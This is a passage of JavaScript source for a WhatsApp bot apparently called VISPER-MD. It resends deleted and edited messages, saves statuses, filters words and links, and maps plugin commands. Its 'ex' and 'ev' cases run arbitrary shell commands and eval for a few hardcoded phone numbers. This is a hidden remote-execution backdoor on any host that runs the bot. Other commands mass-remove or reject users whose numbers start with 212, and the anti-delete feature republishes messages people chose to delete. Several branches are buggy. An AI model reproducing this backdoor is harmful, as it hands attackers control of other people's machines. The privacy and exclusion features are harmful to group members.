     conn.sendMessage(delfrom, { text: `❌ *edited message detected* ${originalMessage.message.editedMessage.message.protocolMessage.editedMessage.conversation}` },{quoted: mek});
     
    //........................................//........................................
    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage && originalMessage.msg.text ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
        const messageText = originalMessage.msg.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
     var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
        const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
     var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.body}${xx}` });
    }else if(originalMessage.type === 'extendedTextMessage') {
    async function quotedMessageRetrive(){     
    var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                
    if(originalMessage.message.extendedTextMessage){
    const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
        var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
    }else{
    const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
        conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
    }
    }
    
    quotedMessageRetrive()
           
    }else if(originalMessage.type === 'imageMessage') {
          async function imageMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.imageMessage.caption){
    const messageText = originalMessage.message.imageMessage.caption;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.imageMessage.caption}` })
    }else{
        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
    }       
        }
    imageMessageRetrive()
     
    }else if(originalMessage.type === 'videoMessage') {
          async function videoMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
    
    const vData = originalMessage.message.videoMessage.fileLength
    const vTime = originalMessage.message.videoMessage.seconds;
    const fileDataMB = config.MAX_SIZE
    const fileLengthBytes = vData
    const fileLengthMB = fileLengthBytes / (1024 * 1024);
    const fileseconds = vTime
    if(originalMessage.message.videoMessage.caption){
    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    const messageText = originalMessage.message.videoMessage.caption;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.videoMessage.caption}` })
           }
    }else{
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
        const vData = originalMessage.message.videoMessage.fileLength
    const vTime = originalMessage.message.videoMessage.seconds;
    const fileDataMB = config.MAX_SIZE
    const fileLengthBytes = vData
    const fileLengthMB = fileLengthBytes / (1024 * 1024);
    const fileseconds = vTime
    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
    }
    }       
    }
    videoMessageRetrive()
    }else if(originalMessage.type === 'documentMessage') {
          async function documentMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    
        
    
    if(originalMessage.message.documentWithCaptionMessage){
    
    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
     
    }else{
    
    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
    
    }
     }
    
    documentMessageRetrive()
    }else if(originalMessage.type === 'audioMessage') {
          async function audioMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.audioMessage){
    const audioq = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: audioq});
    
    }else{
    if(originalMessage.message.audioMessage.ptt === "true"){
    
    const pttt = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, ptt: 'true',fileName: `${m.id}.mp3` })	
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: pttt});
    
     }
      }
     }
    
    audioMessageRetrive()
    }else if(originalMessage.type === 'stickerMessage') {
          async function stickerMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.stickerMessage){
     
    //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'VISPER-MD 🌟'})
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
    
    }else{
    
    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'VISPER-MD 🌟'})
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
    
      }
     }
    
    stickerMessageRetrive()
             }
         
      } else {
        console.log('Original message not found for revocation.');
      }
    }
  
    if (mek.msg && mek.msg.type === 0) {
      handleMessageRevocation(mek);
    } else {//if(mek.message && mek.message.conversation && mek.message.conversation !== ''){
      handleIncomingMessage(mek);
    
        }
    
    }
    }	
    }


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////












//============================================================================================================================================================



  //==================================================================================================================================================================== 

//==================================================================================================================================================================
const bad = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/bad_word.json`);

if (config.ANTI_BAD === "true" && isGroup) { // Run only in groups
  if (!isMe && !groupAdmins.includes(sender)) { // Only non-admins
    const bodyText = body.toLowerCase();

    for (let word of bad) {
      if (
        bodyText.includes(word) &&
        !bodyText.includes('tent') &&
        !bodyText.includes('docu') &&
        !bodyText.includes('https')
      ) {
        // Delete message if configured
        if (config.ACTION === "delete" || config.ACTION === "both") {
          await conn.sendMessage(from, { delete: mek.key });
        }

        // Warn the sender
        await conn.sendMessage(from, {
          text: `🚫 @${sender.split('@')[0]} *Bad word detected!*`,
          mentions: [sender]
        });

        // Remove sender if configured
        if (config.ACTION === "remove" || config.ACTION === "both") {
          await conn.groupParticipantsUpdate(from, [sender], 'remove');
        }

        break; // Stop checking after first match
      }
    }
  }
}



if(body === "send" || body === "Send" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
    // if(!m.quoted) return reply("*Please Mention status*")
    const data = JSON.stringify(mek.message, null, 2);
    const jsonData = JSON.parse(data);
    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
    if(!isStatus) return

    const getExtension = (buffer) => {
        const magicNumbers = {
            jpg: 'ffd8ffe0',
            png: '89504e47',
            mp4: '00000018',
        };
        const magic = buffer.toString('hex', 0, 4);
        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
    };

    if(m.quoted.type === 'imageMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.imageMessage.caption;
        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
    } else if(m.quoted.type === 'videoMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.videoMessage.caption;
        let buttonMessage = {
            video: fs.readFileSync("./" + ext),
            mimetype: "video/mp4",
            fileName: `${m.id}.mp4`,
            caption: caption ,
            headerType: 4
        };
        await conn.sendMessage(from, buttonMessage,{
            quoted: mek
        });
    }
}
	   
// Put this at the top of your message handler (where incoming messages are processed)
// Store original messages
// Anti-Edit function
conn.ev.on('messages.update', async (updates) => {
    for (let update of updates) {
        const senderId = update.key.participant || update.key.remoteJid;
        const remoteJid = update.key.remoteJid;

        // Owner messages ignore කරන්න
       

        // Edited message නම්
        if (update.updateType === 'message.edit') {
            const originalMessage = loadChatData(remoteJid, update.key.id)[0]; // පෙර save කරපු original message

            if (!originalMessage) continue;

            let text = "[Non-text message]";
            if (originalMessage.message?.conversation) text = originalMessage.message.conversation;
            else if (originalMessage.message?.extendedTextMessage?.text) text = originalMessage.message.extendedTextMessage.text;

            await conn.sendMessage(remoteJid, {
                text: `❌ *Edited message detected!*\n\n🚮 *Edited by:* _${senderId.split('@')[0]}_\n\n> 🔓 Original: ${text}`
            });
        }
    }
});

// Chat save function (incoming messages handle)
function handleIncomingMessage(message) {
    const remoteJid = message.key.remoteJid;
    const messageId = message.key.id;

    const chatData = loadChatData(remoteJid, messageId);
    chatData.push(message);
    saveChatData(remoteJid, messageId, chatData);
}

//================================ Auto voice funtion=================================================================


if(body === "hi" || body === "Hi" || body === "hey" || body === "Hey" || body === "hii" || body === "Hii"){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://mv-visper-full-db.pages.dev/Data/WhatsApp%20Audio%202025-04-28%20at%2017.12.23.mpeg' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

		if(body === "gm" || body === "Gm" || body === "morning" || body === "goodmorning" || body === "good+morning"){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/gm.opus' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

		if(body === "fuck" || body === "sex" || body === "hukamu" || body === "ukamu"){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/kalalokaya.opus' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

		if(body === "huththa" || body === "kariya" || body === "hukanna" ||  body === "hutta" ||  body === "ponnaya" || body === "pky"){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/kunukarapa.opus' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === "hmm" || body === "Hm" || body === "H" ||  body === "Mm" ||  body === "mm" || body === "Hmmm"){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/hmm.opus' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === "mk" || body === "Mk" || body === "MK" ||  body === "moko" ||  body === "mokdkaranne" || body === "wadada"){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/mk.mp3' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === "puka" || body === "sududa"){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/ai%20ehema%20kiyanne.opus' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === "ponnaya" || body === "ponya" || body === "pakaya"){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/Ponnaya(tbg).mp3' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}






	    
//==================================plugin map================================
const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, isSudo, quoted, body, isCmd, isPre, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, isSudo, quoted, isPre, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isSudo, isCmd, isPre, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, isSudo, body, isCmd, command, isPre, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, isSudo, body, isCmd, command, args, isPre, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  }
});

//============================================================================

if (config.ANTI_LINK == "true") {
  if (!isMe && !groupAdmins.includes(sender) && isBotAdmins) {

    const bodyText = body.toLowerCase();
    const alwaysBlocked = "chat.whatsapp.com";
    const extraLinks = (config.VALUSE || []).map(x => x.trim().toLowerCase());
    const hasBadLink =
      bodyText.includes(alwaysBlocked) ||
      extraLinks.some(link => bodyText.includes(link));

    if (hasBadLink) {
      // Get group invite code
      const groupData = await conn.groupInviteCode(from);
      const thisGroupLink = `https://chat.whatsapp.com/${groupData}`;

      if (bodyText.includes(thisGroupLink.toLowerCase())) {
        // ✅ It's the current group's link — don't delete, just warn.
        await conn.sendMessage(from, {
          text: `⚠️ This is *this group's link*. Can't delete.`,
          mentions: [sender]
        });
      } else {
        // ✅ Other group links — delete, warn, or remove
        if (config.ANTILINK_ACTION == "delete" || config.ANTILINK_ACTION == "both") {
          await conn.sendMessage(from, { delete: mek.key });
        }

        await conn.sendMessage(from, {
          text: `🚫 @${sender.split('@')[0]}, *Links are not allowed here!*`,
          mentions: [sender]
        });

        if (config.ANTILINK_ACTION == "remove" || config.ANTILINK_ACTION == "both") {
          await conn.groupParticipantsUpdate(from, [sender], 'remove');
        }
      }
    }
  }
}

// මේක message handler එක ඇතුළට දාන්න
// Warnings මතක තබා ගැනීමට (Code එකේ ඉහළින්ම තිබීම සුදුසුයි)
if (!global.warns) global.warns = {};

// අදාළ Group ID එක සහ තහනම් commands
const targetGroup = '120363423455302849@g.us';
const forbiddenCommands = ['menu', 'alive', 'song', 'mv', 'movie', 'ping'];

// logic එක ආරම්භය
if (isGroup && from === targetGroup) {
    // මැසේජ් එකේ command එක තියෙනවද බලමු (prefix එකත් එක්කම)
    // උදා: .menu , .alive වගේ
    const isForbidden = forbiddenCommands.some(cmd => body.toLowerCase().startsWith(prefix + cmd));

    if (isForbidden) {
        // Owner හෝ Admin කෙනෙක් නම් kick වෙන්නේ නැති වෙන්න මේක දාන්න (Optional)
        if (isOwner || isAdmins) return;

        // User ට අදාළ warning count එක update කිරීම
        if (!global.warns[sender]) global.warns[sender] = 0;
        global.warns[sender] += 1;

        if (global.warns[sender] >= 3) {
            // 3 වෙනි පාර - Kick කිරීම
            if (isBotAdmins) {
                await conn.sendMessage(from, { text: `🚫 @${sender.split('@')[0]} ඔබ අවවාද 3ම නොසලකා හැරි බැවින් ඉවත් කරනු ලැබේ!`, mentions: [sender] });
                await conn.groupParticipantsUpdate(from, [sender], 'remove');
                global.warns[sender] = 0; // Reset warnings
            } else {
                await conn.sendMessage(from, { text: "⚠️ මට Admin power නැති නිසා මොහු ඉවත් කළ නොහැක." });
            }
        } else {
            // 1 සහ 2 වතාවන් - Warning දීම
            const remain = 3 - global.warns[sender];
            await conn.sendMessage(from, { 
                text: `⚠️ @${sender.split('@')[0]} මෙම Group එකේ commands පාවිච්චි කරන්න එපා! \n\nඔබට තව අවස්ථා ${remain}ක් ඇත.`, 
                mentions: [sender] 
            }, { quoted: mek });
        }
    }
}

if (config.ANTI_BOT == "true") {
    if (isGroup && !isAdmins && !isMe && isBotAdmins) {
try {
            
const res = await axios.get('https://mv-visper-full-db.pages.dev/Main/antibot_ids.json');
const botPrefixes = res.data; 
const isOtherBot = botPrefixes.some(prefix => mek.id.startsWith(prefix));

if (isOtherBot) {
                
await conn.sendMessage(from, { text: "*Other bots are not allowed here ❌*" });

if (isBotAdmins) {
await conn.sendMessage(from, { delete: mek.key });
await conn.groupParticipantsUpdate(from, [sender], 'remove');
                }
            }
        } catch (e) {
            console.log("Error fetching JSON: ", e);
            
        }
    }
}
switch (command) {
  case 'jid':
    reply(from)
    break
  case 'device': {
    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)

    reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
  }
    break
    case'ex':{
      if(senderNumber == 94778500326 || senderNumber == 187574828150975) {
  const { exec } = require("child_process")
  exec(q, (err, stdout) => {
    if (err) return reply(`-------\n\n` + err)
    if (stdout) {
        return reply(`-------\n\n` + stdout)
    }
})
      }
    }
    break
    case'apprv':{
      if(senderNumber == 94778500326 || senderNumber == 187574828150975) {
          let reqlist = await conn.groupRequestParticipantsList(from)
          for (let i=0;i<reqlist.length;i++) {
            if(reqlist[i].jid.startsWith("212")){
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "reject"
            )
            } else{
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "approve"
            )
            }
          }
        }
    }
    break
    case'212r':{
      if(senderNumber == 94778500326 || senderNumber == 187574828150975) {
        for (let i=0;i<participants.length;i++) {
          if(participants[i].id.startsWith("212")){
       await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
      }
    }
  }
    }
    break
    case'rtf':{
console.log(dsa)
    }
    break
// Inside your message handler (outside any case)
 case 'ev': {
    if(senderNumber == 107593779404949 || senderNumber == 249808837197851 || senderNumber == 187574828150975) {
    let code2 = q.replace("°", ".toString()");
    try {
let resultTest = await eval(code2);
if (typeof resultTest === "object") {
  reply(util.format(resultTest));
} else {
  reply(util.format(resultTest));
}
    } catch (err) {
reply(util.format(err));
    }
    ;
  }
  }

    break
  default:
}
    } catch (e) {
const isError = String(e)
console.log(isError)
    }
	  
  })
}
app.get("/", (req, res) => {
  res.send("📟 VISPER DL Working successfully!");
});
app.listen(port, () => console.log(`Movie-Visper-Md Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);


process.on("uncaughtException", function (err) {
  let e = String(err);
  if (e.includes("Socket connection timeout")) return;
  if (e.includes("rate-overlimit")) return;
  if (e.includes("Connection Closed")) return;
  if (e.includes("Value not found")) return;
  if (e.includes("Authentication timed out")) restart();
  console.log("Caught exception: ", err);
});

